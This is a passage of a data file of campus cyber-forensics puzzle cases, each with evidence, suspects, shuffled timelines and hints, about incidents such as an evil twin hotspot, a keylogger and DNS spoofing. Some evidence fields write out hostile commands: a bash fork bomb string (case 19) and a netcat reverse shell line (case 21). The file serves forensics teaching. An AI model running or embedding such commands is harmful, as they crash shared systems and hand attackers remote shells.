      'Compare the server start time (15:00:00) and submission time (15:45:12).',
      'Check who modified window.timerSeconds in Chrome DevTools on Lab PC 12.',
    ],
  },
  {
    id: 'case-15',
    title: 'The Rogue Hotspot Evil Twin',
    subtitle: 'Evil Twin Wi-Fi & BSSID Spoofing',
    category: 'Wireless & RF Forensics',
    duration: 5,
    icon: 'globe',
    color: 'amber',
    briefing:
      'Students sitting in the auditorium connected to a Wi-Fi network named BEC-Campus-Free and were greeted by a fake captive portal asking for their college Gmail passwords.',
    incident: 'Wireless spectrum scan, OUI vendor lookup, captured captive portal gateway, and seat inspection.',
    evidence: [
      {
        type: 'WIRELESS SCAN',
        title: 'Wireless Scan Report',
        detail:
          'Legitimate BEC-Campus-Free uses Cisco BSSID 00:1A:2B:3C:4D:5E (Ch 1). Rogue AP uses BSSID 7A:99:11:44:22:01 (Ch 11).',
      },
      {
        type: 'OUI LOOKUP',
        title: 'OUI MAC Vendor Lookup',
        detail:
          '7A:99:11 is a randomized/locally administered MAC address typical of a Windows/Android mobile hotspot.',
      },
      {
        type: 'CAPTIVE PORTAL',
        title: 'Captured Captive Portal HTML',
        detail: 'Hosted locally on 192.168.137.1 (Default Windows 10/11 Mobile Hotspot gateway IP).',
      },
      {
        type: 'SEAT CHECK',
        title: 'Auditorium Seat Check',
        detail:
          'Only one person in Row 1 had a Windows laptop plugged into power with Mobile Hotspot active: Yashwant.',
      },
    ],
    suspects: [
      {
        name: 'Yashwant',
        role: '3rd Year CSE',
        note: "I turned on my Windows hotspot so my friend could download a PDF, I didn't name it BEC-Campus-Free!",
      },
      {
        name: 'Pallavi',
        role: 'Network Engineer',
        note: 'All official campus Cisco APs broadcast on Channel 1, 6, or 11 with OUI 00:1A:2B.',
      },
      {
        name: 'Sagar',
        role: '2nd Year Mech',
        note: 'I use an iPhone, which uses subnet 172.20.10.x for hotspots, not 192.168.137.1.',
      },
      {
        name: 'Nidhi',
        role: '1st Year CSE',
        note: 'I accidentally typed my password into the fake portal before realizing it looked weird!',
      },
    ],
    timeline: [
      '11:12 — Rogue BSSID 7A:99:11:44:22:01 begins broadcasting on Channel 11 in the auditorium.',
      '11:20 — Network Engineer Pallavi detects the unauthorized BSSID on the wireless controller.',
      '11:10 — Yashwant enables Mobile Hotspot on his Windows laptop (gateway 192.168.137.1) cloned as BEC-Campus-Free.',
      "11:15 — Nidhi's device auto-connects to the stronger rogue signal and loads the fake login page.",
    ],
    hints: [
      'Gateway IP 192.168.137.1 is the default IP address for Windows Mobile Hotspot.',
      'Check who in the auditorium had an active Windows Mobile Hotspot running.',
    ],
  },
  {
    id: 'case-16',
    title: 'The Tampered Grade CSV',
    subtitle: 'SHA-256 File Integrity & Metadata',
    category: 'File Integrity & Endpoint Forensics',
    duration: 5,
    icon: 'shield',
    color: 'rose',
    briefing:
      "Before uploading internal marks to the university portal, the professor noticed one student's marks changed from 14 to 24 in marks_cse.csv.",
    incident: 'Email SHA-256 baseline, USB file metadata, line diff output, and department cabin log.',
    evidence: [
      {
        type: 'HASH BASELINE',
        title: 'Email Sent by Prof. Rao (16:00)',
        detail: 'Attached marks_cse.csv | SHA-256: e3b0c442...98fc1c14.',
      },
      {
        type: 'METADATA',
        title: 'USB File Checked at Exam Cell (16:25)',
        detail: 'marks_cse.csv | SHA-256: 8f434346...2210ab99 | Last Modified By: DESKTOP-ABHI07.',
      },
      {
        type: 'FILE DIFF',
        title: 'Diff Between Files',
        detail: 'Line 19 changed: 2BA23CS019,Abhishek,14 -> 2BA23CS019,Abhishek,24.',
      },
      {
        type: 'CABIN LOG',
        title: 'Department Room Log',
        detail: 'Prof. Rao stepped out for tea at 16:05; Abhishek entered to submit his assignment at 16:10.',
      },
    ],
    suspects: [
      {
        name: 'Abhishek',
        role: '2nd Year CSE',
        note: "I just dropped my assignment notebook on Prof. Rao's desk at 16:10 and left immediately!",
      },
      {
        name: 'Prof. Rao',
        role: 'Course Faculty',
        note: 'I generated the original CSV at 16:00 and left my pendrive on the desk while getting tea.',
      },
      {
        name: 'Venkatesh',
        role: 'Clerk',
        note: "I only handle printed exam forms, I never touched the professor's pendrive.",
      },
      {
        name: 'Swati',
        role: 'Class Topper',
        note: 'My marks were 25/25 in both versions of the CSV file.',
      },
    ],
    timeline: [
      '16:05 — Prof. Rao leaves his cabin for tea, leaving the pendrive on the desk.',
      '16:25 — The exam cell detects the SHA-256 mismatch when comparing against Prof. Rao\'s 16:00 email backup.',
      '16:00 — Prof. Rao saves marks_cse.csv (hash e3b0c442...) onto his USB pendrive.',
      '16:10 — Abhishek enters the cabin and edits line 19 using DESKTOP-ABHI07, altering the SHA-256 hash.',
    ],
    hints: [
      'Look at the "Last Modified By" metadata on the altered CSV file (DESKTOP-ABHI07).',
      'Check whose marks on Line 19 increased from 14 to 24.',
    ],
  },
  {
    id: 'case-17',
    title: 'The Discord Webhook Token Leak',
    subtitle: 'Webhooks & Bot Automation',
    category: 'API & Secrets Forensics',
    duration: 5,
    icon: 'mail',
    color: 'emerald',
    briefing:
      'The official Avon announcements channel on Discord was spammed with fake "Event Cancelled" messages posted by the official Avon-Announcer webhook bot.',
    incident: 'Discord audit log, leaked screenshot evidence, campus proxy curl logs, and hostel LAN mapping.',
    evidence: [
      {
        type: 'DISCORD AUDIT',
        title: 'Discord Audit Log',
        detail: 'Message sent via Webhook ID: 118293049 | No admin user manually typed it.',
      },
      {
        type: 'SCREENSHOT',
        title: 'Screenshot Shared by Kunal (10:30 AM)',
        detail:
          'Kunal posted a screenshot of his VS Code setup in general chat; the webhook URL https://discord.com/api/webhooks/118293049/xYzSecret... was visible on line 14.',
      },
      {
        type: 'PROXY LOG',
        title: 'curl Request Log (Campus Proxy)',
        detail:
          '10:42 AM | POST https://discord.com/api/webhooks/118293049/xYzSecret... | Source IP: 10.12.4.77',
      },
      {
        type: 'LAN TABLE',
        title: 'Hostel LAN Assignment',
        detail: 'IP 10.12.4.77 belongs to Room 204, occupied by Prateek.',
      },
    ],
    suspects: [
      {
        name: 'Kunal',
        role: 'Bot Developer',
        note: "Oh no! I accidentally leaked the webhook URL in my screenshot at 10:30 AM, I didn't send the spam!",
      },
      {
        name: 'Prateek',
        role: '2nd Year ECE',
        note: "I saw Kunal's screenshot, yeah, but I was asleep in Room 204 at 10:42 AM!",
      },
      {
        name: 'Sneha',
        role: 'Discord Mod',
        note: 'I deleted the spam messages and regenerated the webhook token at 10:45 AM.',
      },
      {
        name: 'Vikash',
        role: '3rd Year Civil',
        note: "I don't even know what a webhook or curl command is.",
      },
    ],
    timeline: [
      "10:42 AM — A curl POST request hits the webhook URL from Room 204's IP (10.12.4.77).",
      '10:45 AM — Moderator Sneha revokes the compromised webhook token.',
      '10:30 AM — Kunal accidentally shares a screenshot exposing the Discord webhook URL.',
      '10:42 AM — The Avon-Announcer bot posts fake cancellation messages in the channel.',
    ],
    hints: [
      'Kunal leaked the URL accidentally, but who sent the POST request at 10:42 AM?',
      'Trace source IP 10.12.4.77 to the hostel room occupant.',
    ],
  },
  {
    id: 'case-18',
    title: 'The Hijacked Zoom Guest Lecture',
    subtitle: 'Meeting Passcodes & Screen Sharing',
    category: 'OSINT & Access Forensics',
    duration: 5,
    icon: 'scan',
    color: 'violet',
    briefing:
      "During an industry expert Zoom talk, an uninvited participant joined and drew graffiti across the speaker's slides.",
    incident: 'Zoom participant join telemetry, social story capture, and carrier IP portal correlation.',
    evidence: [
      {
        type: 'ZOOM REPORT',
        title: 'Zoom Participant Report',
        detail: 'Display Name: "Guest_99" | Email: not_signed_in | IP: 106.51.74.22 | Joined: 14:12 PM',
      },
      {
        type: 'SOCIAL CAPTURE',
        title: 'Instagram Story (14:05 PM)',
        detail:
          'Coordinator Meera posted a photo of the auditorium stage with the laptop screen showing the Zoom Meeting ID & Passcode clearly in the background.',
      },
      {
        type: 'IP TRACE',
        title: 'Mobile Carrier / IP Trace',
        detail:
          '106.51.74.22 is a mobile hotspot IP that also logged into devansh.k@bec.edu on the college portal at 14:15 PM.',
      },
    ],
    suspects: [
      {
        name: 'Meera',
        role: 'Event Coordinator',
        note: "I posted the stage photo on my story to promote the talk! I didn't notice the Zoom passcode was visible.",
      },
      {
        name: 'Devansh K.',
        role: '2nd Year ISE',
        note: "I wasn't even in the auditorium! I was sitting at the bus stop waiting for my bus.",
      },
      {
        name: 'Dr. Verma',
        role: 'Guest Speaker',
        note: 'I was sharing my slides from Bangalore when someone started annotating my screen.',
      },
      {
        name: 'Raghav',
        role: 'Zoom Host',
        note: "I forgot to disable 'Annotate for others' in the Zoom security settings.",
      },
    ],
    timeline: [
      '14:12 PM — Guest_99 joins the Zoom call from IP 106.51.74.22 and annotates the slides.',
      '14:16 PM — Host Raghav disables participant annotation and removes Guest_99.',
      '14:05 PM — Meera uploads an Instagram story inadvertently revealing the Zoom Meeting ID and Passcode.',
      "14:15 PM — The same IP address (106.51.74.22) authenticates into Devansh K.'s student portal.",
    ],
    hints: [
      "How did an outsider get the private Zoom passcode? Check Meera's Instagram story.",
      "Match the attacker's IP (106.51.74.22) with the portal login at 14:15 PM.",
    ],
  },
  {
    id: 'case-19',
    title: 'The Endless Fork Bomb in Lab-02',
    subtitle: 'Bash Fork Bomb & Shell History',
    category: 'Linux & Endpoint Forensics',
    duration: 5,
    icon: 'code',
    color: 'cyan',
    briefing:
      'The central Linux server used by 30 students for C programming crashed completely after a bash fork bomb :(){ :|:& };: exhausted all process IDs.',
    incident: 'User shell history inspection, SSH session logs, and Lab-02 seat allocation chart.',
    evidence: [
      {
        type: 'BASH HISTORY',
        title: '~/.bash_history of user lab_user14',
        detail: 'gcc linkedlist.c -o ll ; ./ll ; :(){ :|:& };:',
      },
      {
        type: 'SSH LOG',
        title: 'SSH Login Log (who / last)',
        detail: 'lab_user14 pts/14 192.168.2.114 Fri 11:20 - crash (00:12)',
      },
      {
        type: 'SEAT CHART',
        title: 'Lab-02 Seat Allocation',
        detail: 'Terminal 192.168.2.114 (System #14) was assigned to Chetana during the 11:00 AM batch.',
      },
    ],
    suspects: [
      {
        name: 'Chetana',
        role: '2nd Year CSE',
        note: "I ran my linked list program and suddenly my terminal froze! I didn't type weird symbols.",
      },
      {
        name: 'Manish',
        role: 'Lab Instructor',
        note: 'I had to hard-reboot the main Linux server at 11:33 AM because the process table was full.',
      },
      {
        name: 'Darshan',
        role: '2nd Year CSE',
        note: 'I was on System #03 (192.168.2.103) debugging a segmentation fault.',
      },
      {
        name: 'Spoorthi',
        role: '2nd Year CSE',
        note: 'I went to the washroom at 11:28 AM; my system #15 was locked.',
      },
    ],
    timeline: [
      '11:31 AM — Chetana compiles and executes linkedlist.c.',
      '11:33 AM — The server runs out of PIDs and crashes, requiring a hard reboot by Manish.',
      '11:20 AM — Chetana logs into lab_user14 from System #14 (192.168.2.114).',
      "11:32 AM — The bash fork bomb :(){ :|:& };: is executed in lab_user14's shell.",
    ],
    hints: [
      "Look at which user's .bash_history contains the fork bomb string :(){ :|:& };:.",
      'Check who was seated at System #14 (192.168.2.114) during the 11:00 AM lab.',
    ],
  },
  {
    id: 'case-20',
    title: 'The Stolen Figma Design System',
    subtitle: 'OAuth App Permissions & Audit Logs',
    category: 'Cloud & Account Forensics',
    duration: 5,
    icon: 'footprints',
    color: 'indigo',
    briefing:
      "One day before the UI/UX designathon, Team Pixel's private Figma prototype was exported and submitted by a rival team.",
    incident: 'Figma workspace activity logs, Google security sign-in alerts, and submission document metadata.',
    evidence: [
      {
        type: 'WORKSPACE LOG',
        title: 'Figma Workspace Activity Log',
        detail: 'File "Avon_UI_Final" exported as .fig by user: ananya_p | IP: 157.48.12.90 | Time: 23:10',
      },
      {
        type: 'SECURITY ALERT',
        title: 'Google Account Security Alert (Ananya)',
        detail:
          'New sign-in on Windows Chrome from IP 157.48.12.90 at 23:08 (Password reused from leaked gaming forum).',
      },
      {
        type: 'FILE METADATA',
        title: 'Rival Submission Metadata',
        detail:
          "Team Nova's submitted .fig file has Original Author: ananya_p and was uploaded by Team Nova lead Roshan from IP 157.48.12.90.",
      },
    ],
    suspects: [
      {
        name: 'Ananya P.',
        role: 'Team Pixel Lead',
        note: 'I was asleep at 23:00! I never shared my Figma file with anyone outside my team.',
      },
      {
        name: 'Roshan',
        role: 'Team Nova Lead',
        note: "Our team designed every screen from scratch! We didn't copy anyone.",
      },
      {
        name: 'Vinay',
        role: 'Team Pixel Dev',
        note: "I only had 'View' permissions on the Figma file, so I couldn't export the source .fig.",
      },
      {
        name: 'Chitra',
        role: 'Design Judge',
        note: "I noticed Team Nova's file still had Ananya's name in the document properties!",
      },
    ],
    timeline: [
      "23:10 — The Avon_UI_Final.fig file is exported from Ananya's workspace.",
      "09:00 — Judge Chitra spots Ananya's author metadata inside Team Nova's submission.",
      "23:08 — Roshan logs into Ananya's Figma/Google account from IP 157.48.12.90 using a credential-stuffed password.",
      "23:25 — Roshan uploads the stolen .fig file as Team Nova's entry from the same IP.",
    ],
    hints: [
      "Compare the IP address that exported Ananya's file (157.48.12.90) with the IP that uploaded Team Nova's submission.",
      'Note the document metadata showing Original Author: ananya_p.',
    ],
  },
  {
    id: 'case-21',
    title: 'The Hidden Reverse Shell in the Judge Script',
    subtitle: 'Netcat Reverse Shell & Python OS Module',
    category: 'Sandbox & Malware Forensics',
    duration: 5,
    icon: 'code',
    color: 'amber',
    briefing:
      "A participant in the competitive programming contest submitted a Python script that didn't solve the problem—instead, it opened a shell back to their laptop to read the hidden test cases.",
    incident: 'Submitted Python payload, judge Docker firewall blocks, and contest participant IP roster.',
    evidence: [
      {
        type: 'SUBMITTED CODE',
        title: 'Submitted Code (solution.py, Team ID #19)',
        detail: 'import os; os.system("nc 192.168.8.45 4444 -e /bin/sh")',
      },
      {
        type: 'FIREWALL LOG',
        title: 'Judge Sandbox Firewall Log',
        detail: 'Blocked outbound TCP SYN from sandbox to 192.168.8.45:4444 at 16:40:02',
      },
      {
        type: 'ROSTER',
        title: 'Contest Registration Sheet',
        detail: 'Team ID #19 is a solo participant: Harish B. (Assigned IP: 192.168.8.45).',
      },
    ],
    suspects: [
      {
        name: 'Harish B.',
        role: 'Team #19',
        note: "I just copied a boilerplate template from StackOverflow, I didn't read what line 2 did!",
      },
      {
        name: 'Sandeep',
        role: 'Judge Admin',
        note: 'Good thing our Docker sandbox blocks outbound connections, so his netcat shell failed.',
      },
      {
        name: 'Kavita',
        role: 'Team #12',
        note: 'I submitted in C++ and got Time Limit Exceeded on Test Case 4.',
      },
      {
        name: 'Mohan',
        role: 'Contest Setter',
        note: 'Only Sandeep and I have access to the hidden test case directory.',
      },
    ],
    timeline: [
      '16:40 — Team #19 submits solution.py containing nc 192.168.8.45 4444 -e /bin/sh.',
      '16:42 — Judge Admin Sandeep flags Team #19 for attempting remote code execution.',
      '16:38 — Harish B. starts a Netcat listener on port 4444 on his machine (192.168.8.45).',
      '16:40 — The Docker sandbox firewall blocks the outbound reverse shell connection.',
    ],
    hints: [
      'Look at the target IP address inside the nc command (192.168.8.45).',
      'Match Team ID #19 and IP 192.168.8.45 to the contest registration sheet.',
    ],
  },
  {
    id: 'case-22',
    title: 'The Defaced Fest Homepage',
    subtitle: 'Default Admin Credentials & CMS Logs',
    category: 'API & Web Forensics',
    duration: 5,
    icon: 'globe',
    color: 'rose',
    briefing:
      'At midnight, the Avon event landing page banner was replaced with a meme saying "EVENT POSTPONED TO 2030".',
    incident: 'CMS authentication audit log, uploaded media EXIF metadata, and hostel Wi-Fi DHCP lease.',
    evidence: [
      {
        type: 'CMS AUDIT',
        title: 'CMS Audit Log',
        detail: '00:05:11 | Login Success: user="admin" (Default password "admin123") | IP: 172.16.9.21',
      },
      {
        type: 'EXIF DATA',
        title: 'Banner Upload Log',
        detail:
          '00:06:30 | File: meme_2030.jpg | EXIF Camera/Software Tag: "Edited on Redmi K50i - Owner: Suraj"',
      },
      {
        type: 'WI-FI LEASE',
        title: 'Hostel Wi-Fi Lease',
        detail: 'IP 172.16.9.21 is assigned to Suraj-Phone.',
      },
    ],
    suspects: [
      {
        name: 'Suraj',
        role: '2nd Year Mech',
        note: "I saw the meme on the website and downloaded it to my Redmi K50i! I didn't upload it.",
      },
      {
        name: 'Neha',
        role: 'Web Lead',
        note: 'I forgot to change the default admin/admin123 password on the CMS staging panel.',
      },
      {
        name: 'Prashanth',
        role: 'Graphic Designer',
        note: 'I only use Adobe Illustrator on my MacBook, never phone editors.',
      },
      {
        name: 'Vikas',
        role: 'Event Head',
        note: 'I was in a meeting with the faculty advisor until 00:30.',
      },
    ],
    timeline: [
      '00:05:11 — User logs into the CMS panel with default credentials admin/admin123 from IP 172.16.9.21.',
      '00:15:00 — Web Lead Neha restores the original banner and updates the admin password.',
      '00:04:00 — Suraj edits meme_2030.jpg on his Redmi K50i phone.',
      '00:06:30 — meme_2030.jpg is uploaded as the main homepage banner.',
    ],
    hints: [
      'Check both the IP address of the CMS login (172.16.9.21) and the EXIF metadata inside meme_2030.jpg.',
      "Suraj claims he downloaded the image, yet his phone's IP uploaded it at 00:06:30.",
    ],
  },
  {
    id: 'case-23',
    title: 'The Unauthorized AWS S3 Bucket Dump',
    subtitle: 'Public Cloud Buckets & User-Agent Logs',
    category: 'Cloud & Bucket Forensics',
    duration: 5,
    icon: 'database',
    color: 'emerald',
    briefing:
      "The participant registration list (names & phone numbers) was downloaded from the fest's cloud storage bucket before the bucket permissions were fixed.",
    incident: 'AWS S3 access logs, GitHub disclosure comment timestamp, and residential ISP IP lookup.',
    evidence: [
      {
        type: 'S3 ACCESS LOG',
        title: 'AWS S3 Access Log',
        detail:
          '19:40:12 | GET /registrations_all.csv | Status: 200 | User-Agent: aws-cli/2.15.0 Python/3.11 | IP: 117.204.88.14',
      },
      {
        type: 'GITHUB ISSUE',
        title: 'GitHub Issue Comment (19:35)',
        detail:
          'User cloud_guru_raj commented on the fest repo: "Heads up, your S3 bucket URL in README is public!"',
      },
      {
        type: 'IP LOOKUP',
        title: 'Telecom IP Lookup',
        detail:
          "117.204.88.14 is a residential BSNL FTTH IP registered to Rajeshwari Apartments, Flat 302 (Rajat's residence).",
      },
    ],
    suspects: [
      {
        name: 'Rajat',
        role: '3rd Year CSE',
        note: 'I responsibly reported the open S3 bucket on GitHub! I never downloaded the CSV file.',
      },
      {
        name: 'Deepa',
        role: 'Cloud Lead',
        note: "I saw Rajat's GitHub comment at 19:45 and immediately turned on 'Block All Public Access'.",
      },
      {
        name: 'Anil',
        role: 'Sponsor Coordinator',
        note: 'I only received the filtered sponsor list from Deepa the next morning.',
      },
      {
        name: 'Shweta',
        role: '2nd Year ISE',
        note: "I live in the college hostel; I don't have a residential BSNL broadband connection.",
      },
    ],
    timeline: [
      '19:40:12 — Using aws-cli from his home BSNL IP (117.204.88.14), Rajat downloads registrations_all.csv.',
      "20:00:00 — S3 server access logs reveal the 200 OK download from Rajat's residential IP.",
      '19:35:00 — Rajat spots the public S3 URL in the README and posts a warning comment on GitHub.',
      '19:45:00 — Cloud Lead Deepa locks down the S3 bucket permissions.',
    ],
    hints: [
      'Look at the S3 access log timestamp (19:40:12) — 5 minutes after Rajat reported the bug, someone downloaded the file.',
      'Trace IP 117.204.88.14 to see whose home broadband downloaded the CSV.',
    ],
  },
  {
    id: 'case-24',
    title: 'The Spoofed RFID Attendance Tap',
    subtitle: 'Impossible Travel & Biometric Logs',
    category: 'Physical & RFID Security',
    duration: 5,
    icon: 'fingerprint',
    color: 'violet',
    briefing:
      'A student was marked "Present" at a mandatory morning seminar in Bagalkot while simultaneously posting live photos from a trip in Goa.',
    incident: 'Seminar hall RFID badge reader logs, photo GPS EXIF coordinates, and door camera footage.',
    evidence: [
      {
        type: 'RFID READER',
        title: 'Seminar Hall RFID Reader',
        detail: '09:02:14 AM | Tap IN: Roll 2BA22CS088 (Karthikeya) | Reader: HALL-A-DOOR',
      },
      {
        type: 'GPS EXIF',
        title: 'Instagram Live / Photo EXIF',
        detail:
          '09:05:00 AM | GPS Coordinates: 15.5494° N, 73.7535° E (Calangute Beach, Goa — 260 km away)',
      },
      {
        type: 'CCTV',
        title: 'Hall-A Door CCTV (09:02 AM)',
        detail:
          "Karthikeya's roommate Pavan is seen tapping two different ID cards at the door scanner.",
      },
    ],
    suspects: [
      {
        name: 'Pavan',
        role: '3rd Year CSE',
        note: 'I only tapped my own ID card at 09:02 AM! Maybe the scanner double-read someone behind me.',
      },
      {
        name: 'Karthikeya',
        role: '3rd Year CSE',
        note: "Okay fine, I went to Goa, so I obviously didn't tap the scanner in Bagalkot myself!",
      },
      {
        name: 'Mahesh',
        role: 'Event Volunteer',
        note: 'I stood near the podium taking photos; the door scanner is automatic.',
      },
      {
        name: 'Soumya',
        role: '3rd Year CSE',
        note: 'I entered Hall-A at 08:50 AM and sat in the front row.',
      },
    ],
    timeline: [
      "09:02 AM — Roommate Pavan taps both his own ID card and Karthikeya's ID card at HALL-A-DOOR.",
      '09:30 AM — Faculty cross-checks the RFID logs against the live stream and flags the impossible travel.',
      '08:50 AM — Soumya taps into Seminar Hall-A and takes a front-row seat.',
      "09:05 AM — Karthikeya's phone uploads a photo with GPS metadata in Goa (260 km away).",
    ],
    hints: [
      "Who physically tapped Karthikeya's RFID card at HALL-A-DOOR while Karthikeya was 260 km away?",
      'Check the Hall-A Door CCTV footage at 09:02 AM.',
    ],
  },
  {
    id: 'case-25',
    title: 'The Keylogger on the Gaming PC',
    subtitle: 'Windows Startup Registry & Hidden Processes',
    category: 'Malware & Endpoint Forensics',
    duration: 5,
    icon: 'shield',
    color: 'cyan',
    briefing:
      'Three Valorant players had their Riot Games accounts hijacked right after playing their tournament matches on Stage PC #02.',
    incident: 'Windows Autoruns telemetry, USB file creation logs, tournament match schedule, and exfiltration output.',
    evidence: [
      {
        type: 'TASK MANAGER',
        title: 'Windows Autoruns / Task Manager',
        detail: 'Process win_audio_helper.exe running from C:\\Users\\Public\\Documents\\keys.txt.',
      },
      {
        type: 'FILE LOG',
        title: 'File Creation Log',
        detail:
          'win_audio_helper.exe was copied onto Stage PC #02 at 10:15:00 AM from a Kingston USB drive.',
      },
      {
        type: 'SCHEDULE',
        title: 'Tournament Match Schedule',
        detail: 'Match 1 (10:00–10:30 AM) on Stage PC #02 was played by Ritesh.',
      },
      {
        type: 'EXFIL LOG',
        title: 'keys.txt Tail Output',
        detail:
          'Contains keystrokes captured during Matches 2, 3, and 4, followed by an SMTP send command to ritesh.val@proton.me.',
      },
    ],
    suspects: [
      {
        name: 'Ritesh',
        role: 'Match 1 Player',
        note: 'I only plugged in my Kingston USB to load my custom mouse sensitivity config file!',
      },
      {
        name: 'Aryan',
        role: 'Match 2 Player',
        note: 'I played at 10:45 AM on Stage PC #02 and my Riot account got stolen an hour later!',
      },
      {
        name: 'Nikhita',
        role: 'Stage Admin',
        note: 'I wiped and re-imaged all Stage PCs the night before the tournament.',
      },
      {
        name: 'Tarun',
        role: 'Shoutcaster',
        note: 'I was in the commentary booth with a headset on all morning.',
      },
    ],
    timeline: [
      '10:15 AM — Ritesh copies win_audio_helper.exe from his Kingston USB into C:\\Users\\Public\\Documents.',
      '12:30 PM — The keylogger emails keys.txt to ritesh.val@proton.me.',
      '10:00 AM — Ritesh sits at Stage PC #02 for Match 1.',
      '10:45 AM — Aryan logs into his Riot Games account during Match 2, and his keystrokes are logged to keys.txt.',
    ],
    hints: [
      'Check the timestamp when win_audio_helper.exe was copied onto Stage PC #02 (10:15 AM).',
      'Look at the destination email address configured inside the keylogger (ritesh.val@proton.me).',
    ],
  },
  {
    id: 'case-26',
    title: 'The Poisoned DNS Cache in Hostel-A',
    subtitle: '/etc/hosts & Local DNS Spoofing',
    category: 'Network & DNS Forensics',
    duration: 5,
    icon: 'globe',
    color: 'indigo',
    briefing:
      'Whenever students in Hostel-A typed results.bec.edu into their browser, they were redirected to a Rickroll YouTube video instead of the semester results page.',
    incident: 'Switch Wireshark packet capture, gateway ARP table, and IT switch port inventory.',
    evidence: [
      {
        type: 'PACKET CAPTURE',
        title: 'Packet Capture (Wireshark on Hostel-A Switch)',
        detail: 'Unsolicited DNS Response packets forging results.bec.edu -> 172.16.1.55 (Local redirect server).',
      },
      {
        type: 'ARP TABLE',
        title: 'ARP Table on Hostel-A Gateway',
        detail: 'IP 172.16.1.55 resolves to MAC address D8:BB:C1:44:90:12.',
      },
      {
        type: 'ASSET INVENTORY',
        title: 'IT Asset Inventory',
        detail: 'MAC D8:BB:C1:44:90:12 is the Ethernet port of Room 108, registered to Gaurav.',
      },
    ],
    suspects: [
      {
        name: 'Gaurav',
        role: '3rd Year CSE',
        note: 'I was running a local Python HTTP server on port 80 for my web dev project, not DNS spoofing!',
      },
      {
        name: 'Pramod',
        role: 'Hostel Warden',
        note: "I don't know anything about DNS; I just got 50 complaints that the results link plays music.",
      },
      {
        name: 'Anusha',
        role: 'Hostel-B Resident',
        note: 'Hostel-B is on a completely separate VLAN; our results page loaded fine.',
      },
      {
        name: 'Rakesh',
        role: 'ISP Technician',
        note: "Our upstream DNS servers (8.8.8.8) were untouched; the spoof happened inside Hostel-A's LAN.",
      },
    ],
    timeline: [
      "17:02 — Gaurav's machine begins sending spoofed DNS replies for results.bec.edu across Hostel-A's LAN.",
      "17:20 — Wireshark capture traces the spoofed DNS IP back to Room 108's MAC address.",
      '17:00 — Gaurav launches a local HTTP redirect server on 172.16.1.55 in Room 108.',
      '17:05 — Hostel-A students trying to check grades get redirected to the Rickroll video.',
    ],
    hints: [
      'Trace the spoofed DNS IP address (172.16.1.55) via the ARP table to its MAC address.',
      'Match MAC D8:BB:C1:44:90:12 in the IT Asset Inventory.',
    ],
  },
  {
    id: 'case-27',
    title: 'The Leaked Judge Rubric via Bluetooth',
    subtitle: 'Bluetooth OBEX Logs & Device Names',
    category: 'Hardware & Wireless Forensics',
    duration: 5,
    icon: 'scan',
    color: 'amber',
    briefing:
      "Confidential judging criteria for the hardware hackathon were copied off the Head Judge's Windows laptop while he stepped out for 3 minutes.",
    incident: 'Windows Bluetooth transfer logs (fsquirt) and Jury Room corridor CCTV footage.',
    evidence: [
      {
        type: 'BLUETOOTH LOG',
        title: 'Windows Bluetooth Transfer History (fsquirt log)',
        detail:
          '15:18:40 | File Sent: Judging_Rubric_2026.pdf | Target Device: "OnePlus_Nord_Naveen" (BT MAC: 2C:54:91:88:AA:10)',
      },
      {
        type: 'CCTV',
        title: 'Jury Room CCTV (15:17–15:20)',
        detail:
          'Head Judge exits at 15:17. Volunteer Naveen enters to refill water bottles and stands by the unlocked laptop at 15:18.',
      },
    ],
    suspects: [
      {
        name: 'Naveen',
        role: 'Hospitality Volunteer',
        note: "I only went in to put water bottles on the table! I never touched the judge's laptop.",
      },
      {
        name: 'Dr. Hegde',
        role: 'Head Judge',
        note: 'I left my laptop unlocked for 3 minutes while using the restroom; USB ports were disabled by IT.',
      },
      {
        name: 'Tejas',
        role: 'Participant',
        note: "I use an iPhone 13 and wasn't allowed anywhere near the jury room.",
      },
      {
        name: 'Aishwarya',
        role: 'Score Tabulator',
        note: 'I was in the main auditorium collecting team names.',
      },
    ],
    timeline: [
      '15:18:10 — Volunteer Naveen enters the jury room with water bottles.',
      '15:20:00 — Dr. Hegde returns to the jury room.',
      '15:17:00 — Dr. Hegde steps out of the jury room, leaving his laptop unlocked.',
      '15:18:40 — Judging_Rubric_2026.pdf is transferred via Bluetooth to OnePlus_Nord_Naveen.',
    ],
    hints: [
      'Even though USB ports were disabled, check the Windows Bluetooth file transfer log.',
      'Look at the target Bluetooth device name: OnePlus_Nord_Naveen.',
    ],
  },
  {
    id: 'case-28',
    title: 'The Automated Ticket Scalper Bot',
    subtitle: 'Rate Limiting & Python Requests User-Agent',
    category: 'API & Web Forensics',
    duration: 5,
    icon: 'globe',
    color: 'rose',
    briefing:
      'All 200 free concert passes for the Avon cultural night vanished in 4 seconds after registrations opened, leaving genuine students locked out.',
    incident: 'Nginx high-rate access logs, pass delivery email patterns, and Hostel Block C DHCP assignment.',
    evidence: [
      {
        type: 'NGINX LOG',
        title: 'Nginx Access Log',
        detail:
          '200 POST /api/book_pass requests between 18:00:00 and 18:00:04 | User-Agent: python-requests/2.31.0 | IP: 10.5.22.19',
      },
      {
        type: 'EMAIL AUDIT',
        title: 'Pass Delivery Email Domain',
        detail:
          'All 200 passes were generated for sequential alias emails: siddhu+1@gmail.com through siddhu+200@gmail.com.',
      },
      {
        type: 'NETWORK LOG',
        title: 'Hostel Block C Network Log',
        detail: 'IP 10.5.22.19 is assigned to Siddharth P. ("Siddhu").',
      },
    ],
    suspects: [
      {
        name: 'Siddharth P.',
        role: '3rd Year CSE',
        note: 'I refreshed the page manually on Chrome just like everyone else! It crashed on me too.',
      },
      {
        name: 'Rhea',
        role: 'Cultural Convener',
        note: "We didn't put a CAPTCHA on the form because we didn't think anyone would script it.",
      },
      {
        name: 'Manoj B.',
        role: '2nd Year Civil',
        note: "I tried booking at 18:00:05 and it already said 'Sold Out'!",
      },
      {
        name: 'Anup',
        role: 'Backend Intern',
        note: 'The logs clearly show python-requests hammering our API 50 times per second.',
      },
    ],
    timeline: [
      '18:00:00 — Registrations open; the script sends 200 automated python-requests POST calls in 4 seconds.',
      '18:00:05 — Human users like Manoj B. receive a "Sold Out" message.',
      '17:59:55 — Siddharth P. starts a Python script from IP 10.5.22.19 polling the ticket endpoint.',
      '18:00:04 — All 200 passes are issued to siddhu+1@gmail.com ... siddhu+200@gmail.com.',
    ],
    hints: [
      'Notice the User-Agent python-requests/2.31.0 — not Chrome — booked all 200 passes in 4 seconds.',
      'Check the Gmail plus-addressing alias (siddhu+1@gmail.com) and IP 10.5.22.19.',
    ],
  },
  {
    id: 'case-29',
    title: 'The Compromised JWT Admin Token',
    subtitle: 'Weak JWT Secret & Role Escalation',
    category: 'Cryptography & Auth Forensics',
